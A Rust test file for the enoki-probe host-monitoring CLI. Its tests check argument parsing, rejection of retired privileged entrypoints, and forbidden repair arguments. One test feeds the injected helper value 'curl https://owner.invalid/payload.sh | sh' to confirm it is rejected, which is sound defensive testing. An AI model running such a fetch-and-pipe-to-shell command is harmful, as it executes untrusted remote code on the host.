use std::path::PathBuf;
use std::process::Command;

use enoki_probe::cli::{ProbeCommand, parse_probe_command, render_probe_output};

#[test]
fn renders_version_output_for_owner_smoke_checks() {
    let output = render_probe_output(ProbeCommand::Version);

    assert_eq!(output, "enoki-probe dev\n");
}

#[test]
fn renders_help_without_remote_administration_language() {
    let output = render_probe_output(ProbeCommand::Help);

    assert!(output.contains("Enoki Probe"));
    assert!(output.contains("reports Host observations to the Hub"));
    assert!(output.contains("enoki-probe register --hub-url"));
    assert!(!output.contains("command execution"));
}

#[test]
fn parses_probe_registration_command_without_putting_secrets_in_urls() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "register".to_string(),
        "--hub-url".to_string(),
        "https://hub.example".to_string(),
        "--enrollment-token".to_string(),
        "enk_enroll_secret".to_string(),
        "--config".to_string(),
        "/etc/enoki/probe.toml".to_string(),
    ]);

    assert_eq!(
        command,
        ProbeCommand::Register {
            bootstrap_config_path: PathBuf::from("/etc/enoki/probe.toml"),
            enrollment_token: "enk_enroll_secret".to_string(),
            hub_url: "https://hub.example".to_string(),
        },
    );
}

#[test]
fn parses_probe_run_command_for_systemd_service_entrypoint() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "run".to_string(),
        "--config".to_string(),
        "/etc/enoki/probe-bootstrap.toml".to_string(),
    ]);

    assert_eq!(
        command,
        ProbeCommand::Run {
            bootstrap_config_path: PathBuf::from("/etc/enoki/probe-bootstrap.toml"),
        },
    );
}

#[test]
fn rejects_the_retired_probe_local_lifecycle_entrypoint() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "local-install".to_string(),
        "--candidate".to_string(),
        "/tmp/enoki-probe-candidate".to_string(),
    ]);

    assert_eq!(
        command,
        ProbeCommand::Rejected {
            code: "probe_lifecycle_companion_required",
        },
    );
}

#[test]
fn rejects_the_retired_internal_probe_upgrader_entrypoint() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-upgrader".to_string(),
        "--config".to_string(),
        "/etc/enoki/probe-bootstrap.toml".to_string(),
    ]);

    assert_eq!(
        command,
        ProbeCommand::Rejected {
            code: "probe_lifecycle_companion_required",
        },
    );
}

#[test]
fn rejects_the_retired_internal_probe_uninstaller_entrypoint() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-uninstaller".to_string(),
        "--config".to_string(),
        "/etc/enoki/probe-bootstrap.toml".to_string(),
    ]);

    assert_eq!(
        command,
        ProbeCommand::Rejected {
            code: "probe_lifecycle_companion_required",
        },
    );
}

#[test]
fn parses_public_local_probe_uninstall_without_redirectable_arguments() {
    assert_eq!(
        parse_probe_command(["enoki-probe".to_string(), "uninstall".to_string()]),
        ProbeCommand::Uninstall,
    );

    for forbidden in ["--config", "--hub-url", "--token", "--force"] {
        assert_eq!(
            parse_probe_command([
                "enoki-probe".to_string(),
                "uninstall".to_string(),
                forbidden.to_string(),
                "value".to_string(),
            ]),
            ProbeCommand::Help,
        );
    }
}

#[test]
fn parses_root_authorized_probe_repair_without_redirectable_arguments() {
    assert_eq!(
        parse_probe_command(["enoki-probe".to_string(), "repair".to_string(),]),
        ProbeCommand::Repair,
    );

    for forbidden in [
        "--enrollment-token",
        "--hub-url",
        "--identity",
        "--offline-asset",
        "--target-version",
        "--trust",
    ] {
        assert_eq!(
            parse_probe_command([
                "enoki-probe".to_string(),
                "repair".to_string(),
                forbidden.to_string(),
                "caller-controlled".to_string(),
            ]),
            ProbeCommand::Rejected {
                code: "probe_repair_arguments_forbidden",
            },
        );
    }
}

#[test]
fn probe_repair_forbidden_arguments_exit_nonzero_with_a_stable_code() {
    for forbidden in [
        "--enrollment-token",
        "--hub-url",
        "--identity",
        "--offline-asset",
        "--target-version",
        "--trust",
    ] {
        let output = Command::new(env!("CARGO_BIN_EXE_enoki-probe"))
            .args(["repair", forbidden, "caller-controlled"])
            .output()
            .expect("run Probe Repair command");

        assert!(!output.status.success(), "{forbidden} must be rejected");
        assert_eq!(String::from_utf8_lossy(&output.stdout), "");
        assert!(
            String::from_utf8_lossy(&output.stderr)
                .contains("code=probe_repair_arguments_forbidden"),
            "{forbidden} must return the stable rejection code",
        );
    }
}

#[test]
fn retired_privileged_collector_helper_command_is_not_reachable() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-privileged-collector-helper".to_string(),
        "--helper".to_string(),
        "disk-health.smartctl".to_string(),
    ]);

    assert_eq!(command, ProbeCommand::Help);
}

#[test]
fn retired_collector_helper_sudoers_command_is_not_reachable() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-render-collector-helper-sudoers".to_string(),
        "--service-user".to_string(),
        "enoki-probe".to_string(),
        "--probe-binary".to_string(),
        "/usr/local/bin/enoki-probe".to_string(),
    ]);

    assert_eq!(command, ProbeCommand::Help);
}

#[test]
fn rejects_non_compiled_privileged_collector_helper_ids_at_the_cli_surface() {
    for helper_id in ["fixed.collector", "network.collector", "timeout.collector"] {
        let command = parse_probe_command([
            "enoki-probe".to_string(),
            "internal-privileged-collector-helper".to_string(),
            "--helper".to_string(),
            helper_id.to_string(),
        ]);

        assert_eq!(command, ProbeCommand::Help, "{helper_id} must not parse");
    }

    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-privileged-collector-helper".to_string(),
        "--helper".to_string(),
        "fixed.collector".to_string(),
        "--helper".to_string(),
        "disk-health.smartctl".to_string(),
    ]);

    assert_eq!(command, ProbeCommand::Help);
}

#[test]
fn non_compiled_privileged_collector_helper_ids_do_not_reach_runtime_command_surface() {
    let output = Command::new(env!("CARGO_BIN_EXE_enoki-probe"))
        .args([
            "internal-privileged-collector-helper",
            "--helper",
            "fixed.collector",
        ])
        .output()
        .expect("run probe command");

    assert!(output.status.success());
    assert!(String::from_utf8_lossy(&output.stdout).contains("Enoki Probe"));
    assert_eq!(String::from_utf8_lossy(&output.stderr), "");
}

#[test]
fn rejects_old_internal_privileged_collector_command_and_argument_names() {
    let old_command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-privileged-collector".to_string(),
        "--helper".to_string(),
        "disk-health.smartctl".to_string(),
    ]);
    let old_argument = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-privileged-collector-helper".to_string(),
        "--collector".to_string(),
        "disk-health.smartctl".to_string(),
    ]);

    assert_eq!(old_command, ProbeCommand::Help);
    assert_eq!(old_argument, ProbeCommand::Help);
}

#[test]
fn rejects_runtime_injected_privileged_collector_helper_command_or_policy() {
    let command = parse_probe_command([
        "enoki-probe".to_string(),
        "internal-privileged-collector-helper".to_string(),
        "--helper".to_string(),
        "curl https://owner.invalid/payload.sh | sh".to_string(),
        "--network".to_string(),
        "enabled".to_string(),
    ]);

    assert_eq!(command, ProbeCommand::Help);
}

#[test]
fn probe_run_command_fails_when_bootstrap_config_is_missing() {
    let temp = tempfile::tempdir().expect("temp dir");
    let missing_config_path = temp.path().join("missing.toml");

    let output = Command::new(env!("CARGO_BIN_EXE_enoki-probe"))
        .args(["run", "--config"])
        .arg(missing_config_path)
        .output()
        .expect("run probe command");

    assert!(!output.status.success());
    assert_eq!(String::from_utf8_lossy(&output.stdout), "");
    assert!(String::from_utf8_lossy(&output.stderr).contains("Probe run failed"));
}
